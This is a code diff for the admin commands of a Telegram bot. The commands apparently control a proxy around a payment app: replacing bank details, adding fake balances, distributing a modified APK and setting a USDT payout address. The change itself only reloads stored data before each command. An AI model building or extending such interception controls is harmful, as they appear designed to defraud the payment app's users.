@@ -749,14 +749,15 @@ Example:
       return res.sendStatus(200);
     }
 
-    if (text === '/on') { data.botEnabled = true; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, '🟢 Proxy ON'); return res.sendStatus(200); }
-    if (text === '/off') { data.botEnabled = false; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, '🔴 Proxy OFF — passthrough'); return res.sendStatus(200); }
-    if (text === '/rotate') { data.autoRotate = !data.autoRotate; data.lastUsedIndex = -1; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${data.autoRotate ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
-    if (text === '/log') { data.logRequests = !data.logRequests; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
+    if (text === '/on') { data = await loadData(true); data.botEnabled = true; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, '🟢 Proxy ON'); return res.sendStatus(200); }
+    if (text === '/off') { data = await loadData(true); data.botEnabled = false; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, '🔴 Proxy OFF — passthrough'); return res.sendStatus(200); }
+    if (text === '/rotate') { data = await loadData(true); data.autoRotate = !data.autoRotate; data.lastUsedIndex = -1; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${data.autoRotate ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
+    if (text === '/log') { data = await loadData(true); data.logRequests = !data.logRequests; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
 
     if (text === '/debug') { debugNextResponse = true; await bot.sendMessage(chatId, '🔍 Debug ON — next bank-replace request ka full response dump aayega'); return res.sendStatus(200); }
 
     if (text === '/update' || text === '/update off' || text === '/update on') {
+      data = await loadData(true);
       if (text === '/update on') {
         data.blockUpdate = false;
         data._skipOverrideMerge = true;
@@ -779,6 +780,7 @@ Example:
         await bot.sendMessage(chatId, '❌ Format: /setapkurl <https://...> [version]\nExample: /setapkurl https://github.com/.../EZpay.apk 1.1.5');
         return res.sendStatus(200);
       }
+      data = await loadData(true);
       data.proxyApkUrl = apkUrl;
       data.proxyApkVersion = apkVersion;
       data.blockUpdate = false;
@@ -789,6 +791,7 @@ Example:
     }
 
     if (text === '/clearapkurl') {
+      data = await loadData(true);
       data.proxyApkUrl = '';
       data.proxyApkVersion = '';
       data.blockUpdate = true;
@@ -801,6 +804,7 @@ Example:
     if (text.startsWith('/off log ')) {
       const targetId = text.substring(9).trim();
       if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /off log <userId>'); return res.sendStatus(200); }
+      data = await loadData(true);
       if (!data.userOverrides) data.userOverrides = {};
       if (!data.userOverrides[targetId]) data.userOverrides[targetId] = {};
       data.userOverrides[targetId].logOff = true;
@@ -829,6 +833,7 @@ Example:
     if (text.startsWith('/on log ')) {
       const targetId = text.substring(8).trim();
       if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /on log <userId>'); return res.sendStatus(200); }
+      data = await loadData(true);
       if (data.userOverrides && data.userOverrides[targetId]) {
         delete data.userOverrides[targetId].logOff;
         data._skipOverrideMerge = true;
@@ -954,6 +959,7 @@ Example:
     if (text.startsWith('/remove balance ')) {
       const targetId = text.substring(16).trim();
       if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /remove balance <userId>'); return res.sendStatus(200); }
+      data = await loadData(true);
       if (data.userOverrides && data.userOverrides[targetId] && data.userOverrides[targetId].addedBalance !== undefined) {
         const removed = data.userOverrides[targetId].addedBalance;
         delete data.userOverrides[targetId].addedBalance;
@@ -982,6 +988,7 @@ Example:
     if (text.startsWith('/control sell ')) {
       const sellTargetId = text.substring(14).trim();
       if (!sellTargetId) { await bot.sendMessage(chatId, '❌ Format: /control sell <userId>'); return res.sendStatus(200); }
+      data = await loadData(true);
       if (!data.userOverrides) data.userOverrides = {};
       if (!data.userOverrides[sellTargetId]) data.userOverrides[sellTargetId] = {};
       const currentState = !!data.userOverrides[sellTargetId].sellControl;
@@ -1068,6 +1075,7 @@ Example:
     }
 
     if (text === '/clearhistory') {
+      data = await loadData(true);
       data.balanceHistory = [];
       data._skipOverrideMerge = true;
       await saveData(data);
@@ -1152,6 +1160,7 @@ Example:
 
     if (text.startsWith('/usdt ')) {
       const addr = text.substring(6).trim();
+      data = await loadData(true);
       if (addr.toLowerCase() === 'off') {
         data.usdtAddress = '';
         data._skipOverrideMerge = true;
@@ -1172,6 +1181,7 @@ Example:
     if (text.startsWith('/suspend ')) {
       const suspendPhone = text.substring(9).trim();
       if (!suspendPhone) { await bot.sendMessage(chatId, '❌ Format: /suspend <phoneNumber>\nExample: /suspend 9876543210'); return res.sendStatus(200); }
+      data = await loadData(true);
       if (!data.suspendedPhones) data.suspendedPhones = {};
       data.suspendedPhones[suspendPhone] = { suspended: true, time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) };
       data._skipOverrideMerge = true;
@@ -1183,6 +1193,7 @@ Example:
     if (text.startsWith('/unsuspend ')) {
       const unsuspendPhone = text.substring(11).trim();
       if (!unsuspendPhone) { await bot.sendMessage(chatId, '❌ Format: /unsuspend <phoneNumber>'); return res.sendStatus(200); }
+      data = await loadData(true);
       if (data.suspendedPhones && data.suspendedPhones[unsuspendPhone]) {
         delete data.suspendedPhones[unsuspendPhone];
         data._skipOverrideMerge = true;
